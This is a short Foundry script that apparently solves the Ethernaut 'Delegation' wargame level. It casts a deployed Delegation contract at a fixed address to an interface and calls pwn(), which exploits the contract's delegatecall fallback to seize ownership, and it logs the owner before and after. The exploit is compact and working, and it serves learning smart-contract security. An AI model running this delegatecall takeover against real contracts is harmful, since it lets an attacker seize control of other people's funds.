// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {Delegate, Delegation} from "src/delegation/Delegation.sol";

interface IDelegation {
    function pwn() external;
}

contract DelegateScript is Script {
    Delegation internal delegation;

    function setUp() public virtual {
        delegation = Delegation(0xb5cd55D09E01c75B60b5278cc2D65c5b3bB9542b);
    }

    function run() public virtual {
        vm.startBroadcast();
        console2.log(delegation.owner());

        IDelegation(0xb5cd55D09E01c75B60b5278cc2D65c5b3bB9542b).pwn();
        console2.log(delegation.owner());
        vm.stopBroadcast();
    }
}
